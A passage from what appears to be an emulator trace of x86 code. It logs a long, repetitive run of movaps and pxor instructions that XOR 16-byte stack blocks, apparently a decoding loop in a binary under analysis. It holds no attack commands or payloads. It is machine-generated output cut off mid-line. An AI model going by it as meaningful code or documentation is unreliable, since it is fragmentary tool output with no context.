xmm1, xmmword ptr [esp + 0x1c10], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9c10 for stack size 0x10000 0x405425: pxor xmm1, xmmword ptr [esp + 0x8e0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x88e0 for stack size 0x10000 0x40542e: movaps xmmword ptr [esp + 0x1c10], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9c10 for stack size 0x10000 saving data to stack: 0 16 0x405436: movaps xmm1, xmmword ptr [esp + 0x1c20], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9c20 for stack size 0x10000 0x40543e: pxor xmm1, xmmword ptr [esp + 0x8f0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x88f0 for stack size 0x10000 0x405447: movaps xmmword ptr [esp + 0x1c20], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9c20 for stack size 0x10000 saving data to stack: 0 16 0x40544f: movaps xmm1, xmmword ptr [esp + 0x1c30], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9c30 for stack size 0x10000 0x405457: pxor xmm1, xmmword ptr [esp + 0x900], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8900 for stack size 0x10000 0x405460: movaps xmmword ptr [esp + 0x1c30], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9c30 for stack size 0x10000 saving data to stack: 0 16 0x405468: movaps xmm1, xmmword ptr [esp + 0x1c40], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9c40 for stack size 0x10000 0x405470: pxor xmm1, xmmword ptr [esp + 0x910], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8910 for stack size 0x10000 0x405479: movaps xmmword ptr [esp + 0x1c40], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9c40 for stack size 0x10000 saving data to stack: 0 16 0x405481: movaps xmm1, xmmword ptr [esp + 0x1c50], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9c50 for stack size 0x10000 0x405489: pxor xmm1, xmmword ptr [esp + 0x920], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8920 for stack size 0x10000 0x405492: movaps xmmword ptr [esp + 0x1c50], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9c50 for stack size 0x10000 saving data to stack: 0 16 0x40549a: movaps xmm1, xmmword ptr [esp + 0x1c60], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9c60 for stack size 0x10000 0x4054a2: pxor xmm1, xmmword ptr [esp + 0x930], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8930 for stack size 0x10000 0x4054ab: movaps xmmword ptr [esp + 0x1c60], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9c60 for stack size 0x10000 saving data to stack: 0 16 0x4054b3: movaps xmm1, xmmword ptr [esp + 0x1c70], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9c70 for stack size 0x10000 0x4054bb: pxor xmm1, xmmword ptr [esp + 0x940], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8940 for stack size 0x10000 0x4054c4: movaps xmmword ptr [esp + 0x1c70], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9c70 for stack size 0x10000 saving data to stack: 0 16 0x4054cc: movaps xmm1, xmmword ptr [esp + 0x1c80], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9c80 for stack size 0x10000 0x4054d4: pxor xmm1, xmmword ptr [esp + 0x950], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8950 for stack size 0x10000 0x4054dd: movaps xmmword ptr [esp + 0x1c80], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9c80 for stack size 0x10000 saving data to stack: 0 16 0x4054e5: movaps xmm1, xmmword ptr [esp + 0x1c90], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9c90 for stack size 0x10000 0x4054ed: pxor xmm1, xmmword ptr [esp + 0x960], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8960 for stack size 0x10000 0x4054f6: movaps xmmword ptr [esp + 0x1c90], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9c90 for stack size 0x10000 saving data to stack: 0 16 0x4054fe: movaps xmm1, xmmword ptr [esp + 0x1ca0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9ca0 for stack size 0x10000 0x405506: pxor xmm1, xmmword ptr [esp + 0x970], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8970 for stack size 0x10000 0x40550f: movaps xmmword ptr [esp + 0x1ca0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9ca0 for stack size 0x10000 saving data to stack: 0 16 0x405517: movaps xmm1, xmmword ptr [esp + 0x1cb0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9cb0 for stack size 0x10000 0x40551f: pxor xmm1, xmmword ptr [esp + 0x980], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8980 for stack size 0x10000 0x405528: movaps xmmword ptr [esp + 0x1cb0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9cb0 for stack size 0x10000 saving data to stack: 0 16 0x405530: movaps xmm1, xmmword ptr [esp + 0x1cc0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9cc0 for stack size 0x10000 0x405538: pxor xmm1, xmmword ptr [esp + 0x990], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8990 for stack size 0x10000 0x405541: movaps xmmword ptr [esp + 0x1cc0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9cc0 for stack size 0x10000 saving data to stack: 0 16 0x405549: movaps xmm1, xmmword ptr [esp + 0x1cd0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9cd0 for stack size 0x10000 0x405551: pxor xmm1, xmmword ptr [esp + 0x9a0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x89a0 for stack size 0x10000 0x40555a: movaps xmmword ptr [esp + 0x1cd0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9cd0 for stack size 0x10000 saving data to stack: 0 16 0x405562: movaps xmm1, xmmword ptr [esp + 0x1ce0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9ce0 for stack size 0x10000 0x40556a: pxor xmm1, xmmword ptr [esp + 0x9b0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x89b0 for stack size 0x10000 0x405573: movaps xmmword ptr [esp + 0x1ce0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9ce0 for stack size 0x10000 saving data to stack: 0 16 0x40557b: movaps xmm1, xmmword ptr [esp + 0x1cf0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9cf0 for stack size 0x10000 0x405583: pxor xmm1, xmmword ptr [esp + 0x9c0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x89c0 for stack size 0x10000 0x40558c: movaps xmmword ptr [esp + 0x1cf0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9cf0 for stack size 0x10000 saving data to stack: 0 16 0x405594: movaps xmm1, xmmword ptr [esp + 0x1d00], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9d00 for stack size 0x10000 0x40559c: pxor xmm1, xmmword ptr [esp + 0x9d0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x89d0 for stack size 0x10000 0x4055a5: movaps xmmword ptr [esp + 0x1d00], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9d00 for stack size 0x10000 saving data to stack: 0 16 0x4055ad: movaps xmm1, xmmword ptr [esp + 0x1d10], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9d10 for stack size 0x10000 0x4055b5: pxor xmm1, xmmword ptr [esp + 0x9e0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x89e0 for stack size 0x10000 0x4055be: movaps xmmword ptr [esp + 0x1d10], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9d10 for stack size 0x10000 saving data to stack: 0 16 0x4055c6: movaps xmm1, xmmword ptr [esp + 0x1d20], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9d20 for stack size 0x10000 0x4055ce: pxor xmm1, xmmword ptr [esp + 0x9f0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x89f0 for stack size 0x10000 0x4055d7: movaps xmmword ptr [esp + 0x1d20], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9d20 for stack size 0x10000 saving data to stack: 0 16 0x4055df: movaps xmm1, xmmword ptr [esp + 0x1d30], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9d30 for stack size 0x10000 0x4055e7: pxor xmm1, xmmword ptr [esp + 0xa00], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8a00 for stack size 0x10000 0x4055f0: movaps xmmword ptr [esp + 0x1d30], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9d30 for stack size 0x10000 saving data to stack: 0 16 0x4055f8: movaps xmm1, xmmword ptr [esp + 0x1d40], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9d40 for stack size 0x10000 0x405600: pxor xmm1, xmmword ptr [esp + 0xa10], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8a10 for stack size 0x10000 0x405609: movaps xmmword ptr [esp + 0x1d40], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9d40 for stack size 0x10000 saving data to stack: 0 16 0x405611: movaps xmm1, xmmword ptr [esp + 0x1d50], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9d50 for stack size 0x10000 0x405619: pxor xmm1, xmmword ptr [esp + 0xa20], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8a20 for stack size 0x10000 0x405622: movaps xmmword ptr [esp + 0x1d50], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9d50 for stack size 0x10000 saving data to stack: 0 16 0x40562a: movaps xmm1, xmmword ptr [esp + 0x1d60], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9d60 for stack size 0x10000 0x405632: pxor xmm1, xmmword ptr [esp + 0xa30], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8a30 for stack size 0x10000 0x40563b: movaps xmmword ptr [esp + 0x1d60], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9d60 for stack size 0x10000 saving data to stack: 0 16 0x405643: movaps xmm1, xmmword ptr [esp + 0x1d70], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9d70 for stack size 0x10000 0x40564b: pxor xmm1, xmmword ptr [esp + 0xa40], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8a40 for stack size 0x10000 0x405654: movaps xmmword ptr [esp + 0x1d70], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9d70 for stack size 0x10000 saving data to stack: 0 16 0x40565c: movaps xmm1, xmmword ptr [esp + 0x1d80], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9d80 for stack size 0x10000 0x405664: pxor xmm1, xmmword ptr [esp + 0xa50], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8a50 for stack size 0x10000 0x40566d: movaps xmmword ptr [esp + 0x1d80], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9d80 for stack size 0x10000 saving data to stack: 0 16 0x405675: movaps xmm1, xmmword ptr [esp + 0x1d90], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9d90 for stack size 0x10000 0x40567d: pxor xmm1, xmmword ptr [esp + 0xa60], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8a60 for stack size 0x10000 0x405686: movaps xmmword ptr [esp + 0x1d90], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9d90 for stack size 0x10000 saving data to stack: 0 16 0x40568e: movaps xmm1, xmmword ptr [esp + 0x1da0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9da0 for stack size 0x10000 0x405696: pxor xmm1, xmmword ptr [esp + 0xa70], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8a70 for stack size 0x10000 0x40569f: movaps xmmword ptr [esp + 0x1da0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9da0 for stack size 0x10000 saving data to stack: 0 16 0x4056a7: movaps xmm1, xmmword ptr [esp + 0x1db0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9db0 for stack size 0x10000 0x4056af: pxor xmm1, xmmword ptr [esp + 0xa80], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8a80 for stack size 0x10000 0x4056b8: movaps xmmword ptr [esp + 0x1db0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9db0 for stack size 0x10000 saving data to stack: 0 16 0x4056c0: movaps xmm1, xmmword ptr [esp + 0x1dc0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9dc0 for stack size 0x10000 0x4056c8: pxor xmm1, xmmword ptr [esp + 0xa90], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8a90 for stack size 0x10000 0x4056d1: movaps xmmword ptr [esp + 0x1dc0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9dc0 for stack size 0x10000 saving data to stack: 0 16 0x4056d9: movaps xmm1, xmmword ptr [esp + 0x1dd0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9dd0 for stack size 0x10000 0x4056e1: pxor xmm1, xmmword ptr [esp + 0xaa0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8aa0 for stack size 0x10000 0x4056ea: movaps xmmword ptr [esp + 0x1dd0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9dd0 for stack size 0x10000 saving data to stack: 0 16 0x4056f2: movaps xmm1, xmmword ptr [esp + 0x1de0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9de0 for stack size 0x10000 0x4056fa: pxor xmm1, xmmword ptr [esp + 0xab0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8ab0 for stack size 0x10000 0x405703: movaps xmmword ptr [esp + 0x1de0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9de0 for stack size 0x10000 saving data to stack: 0 16 0x40570b: movaps xmm1, xmmword ptr [esp + 0x1df0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9df0 for stack size 0x10000 0x405713: pxor xmm1, xmmword ptr [esp + 0xac0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8ac0 for stack size 0x10000 0x40571c: movaps xmmword ptr [esp + 0x1df0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9df0 for stack size 0x10000 saving data to stack: 0 16 0x405724: movaps xmm1, xmmword ptr [esp + 0x1e00], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9e00 for stack size 0x10000 0x40572c: pxor xmm1, xmmword ptr [esp + 0xad0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8ad0 for stack size 0x10000 0x405735: movaps xmmword ptr [esp + 0x1e00], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9e00 for stack size 0x10000 saving data to stack: 0 16 0x40573d: movaps xmm1, xmmword ptr [esp + 0x1e10], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9e10 for stack size 0x10000 0x405745: pxor xmm1, xmmword ptr [esp + 0xae0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8ae0 for stack size 0x10000 0x40574e: movaps xmmword ptr [esp + 0x1e10], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9e10 for stack size 0x10000 saving data to stack: 0 16 0x405756: movaps xmm1, xmmword ptr [esp + 0x1e20], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9e20 for stack size 0x10000 0x40575e: pxor xmm1, xmmword ptr [esp + 0xaf0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8af0 for stack size 0x10000 0x405767: movaps xmmword ptr [esp + 0x1e20], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9e20 for stack size 0x10000 saving data to stack: 0 16 0x40576f: movaps xmm1, xmmword ptr [esp + 0x1e30], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9e30 for stack size 0x10000 0x405777: pxor xmm1, xmmword ptr [esp + 0xb00], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8b00 for stack size 0x10000 0x405780: movaps xmmword ptr [esp + 0x1e30], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9e30 for stack size 0x10000 saving data to stack: 0 16 0x405788: movaps xmm1, xmmword ptr [esp + 0x1e40], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9e40 for stack size 0x10000 0x405790: pxor xmm1, xmmword ptr [esp + 0xb10], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8b10 for stack size 0x10000 0x405799: movaps xmmword ptr [esp + 0x1e40], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9e40 for stack size 0x10000 saving data to stack: 0 16 0x4057a1: movaps xmm1, xmmword ptr [esp + 0x1e50], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9e50 for stack size 0x10000 0x4057a9: pxor xmm1, xmmword ptr [esp + 0xb20], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8b20 for stack size 0x10000 0x4057b2: movaps xmmword ptr [esp + 0x1e50], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9e50 for stack size 0x10000 saving data to stack: 0 16 0x4057ba: movaps xmm1, xmmword ptr [esp + 0x1e60], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9e60 for stack size 0x10000 0x4057c2: pxor xmm1, xmmword ptr [esp + 0xb30], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8b30 for stack size 0x10000 0x4057cb: movaps xmmword ptr [esp + 0x1e60], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9e60 for stack size 0x10000 saving data to stack: 0 16 0x4057d3: movaps xmm1, xmmword ptr [esp + 0x1e70], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9e70 for stack size 0x10000 0x4057db: pxor xmm1, xmmword ptr [esp + 0xb40], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8b40 for stack size 0x10000 0x4057e4: movaps xmmword ptr [esp + 0x1e70], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9e70 for stack size 0x10000 saving data to stack: 0 16 0x4057ec: movaps xmm1, xmmword ptr [esp + 0x1e80], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9e80 for stack size 0x10000 0x4057f4: pxor xmm1, xmmword ptr [esp + 0xb50], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8b50 for stack size 0x10000 0x4057fd: movaps xmmword ptr [esp + 0x1e80], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9e80 for stack size 0x10000 saving data to stack: 0 16 0x405805: movaps xmm1, xmmword ptr [esp + 0x1e90], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9e90 for stack size 0x10000 0x40580d: pxor xmm1, xmmword ptr [esp + 0xb60], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8b60 for stack size 0x10000 0x405816: movaps xmmword ptr [esp + 0x1e90], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9e90 for stack size 0x10000 saving data to stack: 0 16 0x40581e: movaps xmm1, xmmword ptr [esp + 0x1ea0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9ea0 for stack size 0x10000 0x405826: pxor xmm1, xmmword ptr [esp + 0xb70], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8b70 for stack size 0x10000 0x40582f: movaps xmmword ptr [esp + 0x1ea0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9ea0 for stack size 0x10000 saving data to stack: 0 16 0x405837: movaps xmm1, xmmword ptr [esp + 0x1eb0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9eb0 for stack size 0x10000 0x40583f: pxor xmm1, xmmword ptr [esp + 0xb80], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8b80 for stack size 0x10000 0x405848: movaps xmmword ptr [esp + 0x1eb0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9eb0 for stack size 0x10000 saving data to stack: 0 16 0x405850: movaps xmm1, xmmword ptr [esp + 0x1ec0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9ec0 for stack size 0x10000 0x405858: pxor xmm1, xmmword ptr [esp + 0xb90], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8b90 for stack size 0x10000 0x405861: movaps xmmword ptr [esp + 0x1ec0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9ec0 for stack size 0x10000 saving data to stack: 0 16 0x405869: movaps xmm1, xmmword ptr [esp + 0x1ed0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9ed0 for stack size 0x10000 0x405871: pxor xmm1, xmmword ptr [esp + 0xba0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8ba0 for stack size 0x10000 0x40587a: movaps xmmword ptr [esp + 0x1ed0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9ed0 for stack size 0x10000 saving data to stack: 0 16 0x405882: movaps xmm1, xmmword ptr [esp + 0x1ee0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9ee0 for stack size 0x10000 0x40588a: pxor xmm1, xmmword ptr [esp + 0xbb0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8bb0 for stack size 0x10000 0x405893: movaps xmmword ptr [esp + 0x1ee0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9ee0 for stack size 0x10000 saving data to stack: 0 16 0x40589b: movaps xmm1, xmmword ptr [esp + 0x1ef0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9ef0 for stack size 0x10000 0x4058a3: pxor xmm1, xmmword ptr [esp + 0xbc0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8bc0 for stack size 0x10000 0x4058ac: movaps xmmword ptr [esp + 0x1ef0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9ef0 for stack size 0x10000 saving data to stack: 0 16 0x4058b4: movaps xmm1, xmmword ptr [esp + 0x1f00], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9f00 for stack size 0x10000 0x4058bc: pxor xmm1, xmmword ptr [esp + 0xbd0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8bd0 for stack size 0x10000 0x4058c5: movaps xmmword ptr [esp + 0x1f00], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9f00 for stack size 0x10000 saving data to stack: 0 16 0x4058cd: movaps xmm1, xmmword ptr [esp + 0x1f10], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9f10 for stack size 0x10000 0x4058d5: pxor xmm1, xmmword ptr [esp + 0xbe0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8be0 for stack size 0x10000 0x4058de: movaps xmmword ptr [esp + 0x1f10], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9f10 for stack size 0x10000 saving data to stack: 0 16 0x4058e6: movaps xmm1, xmmword ptr [esp + 0x1f20], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9f20 for stack size 0x10000 0x4058ee: pxor xmm1, xmmword ptr [esp + 0xbf0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8bf0 for stack size 0x10000 0x4058f7: movaps xmmword ptr [esp + 0x1f20], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9f20 for stack size 0x10000 saving data to stack: 0 16 0x4058ff: movaps xmm1, xmmword ptr [esp + 0x1f30], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9f30 for stack size 0x10000 0x405907: pxor xmm1, xmmword ptr [esp + 0xc00], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8c00 for stack size 0x10000 0x405910: movaps xmmword ptr [esp + 0x1f30], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9f30 for stack size 0x10000 saving data to stack: 0 16 0x405918: movaps xmm1, xmmword ptr [esp + 0x1f40], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9f40 for stack size 0x10000 0x405920: pxor xmm1, xmmword ptr [esp + 0xc10], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8c10 for stack size 0x10000 0x405929: movaps xmmword ptr [esp + 0x1f40], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9f40 for stack size 0x10000 saving data to stack: 0 16 0x405931: movaps xmm1, xmmword ptr [esp + 0x1f50], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9f50 for stack size 0x10000 0x405939: pxor xmm1, xmmword ptr [esp + 0xc20], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8c20 for stack size 0x10000 0x405942: movaps xmmword ptr [esp + 0x1f50], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9f50 for stack size 0x10000 saving data to stack: 0 16 0x40594a: movaps xmm1, xmmword ptr [esp + 0x1f60], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9f60 for stack size 0x10000 0x405952: pxor xmm1, xmmword ptr [esp + 0xc30], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8c30 for stack size 0x10000 0x40595b: movaps xmmword ptr [esp + 0x1f60], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9f60 for stack size 0x10000 saving data to stack: 0 16 0x405963: movaps xmm1, xmmword ptr [esp + 0x1f70], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9f70 for stack size 0x10000 0x40596b: pxor xmm1, xmmword ptr [esp + 0xc40], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8c40 for stack size 0x10000 0x405974: movaps xmmword ptr [esp + 0x1f70], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9f70 for stack size 0x10000 saving data to stack: 0 16 0x40597c: movaps xmm1, xmmword ptr [esp + 0x1f80], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9f80 for stack size 0x10000 0x405984: pxor xmm1, xmmword ptr [esp + 0xc50], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8c50 for stack size 0x10000 0x40598d: movaps xmmword ptr [esp + 0x1f80], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x4 and offset 0x9f80 for stack size 0x10000 saving data to stack: 0 16 0x405995: movaps xmm1, xmmword ptr [esp + 0x1f90], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x9f90 for stack size 0x10000 0x40599d: pxor xmm1, xmmword ptr [esp + 0xc60], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x4 and offset 0x8c60 for stack size 0x10000 0x4059a6: movaps xmmword 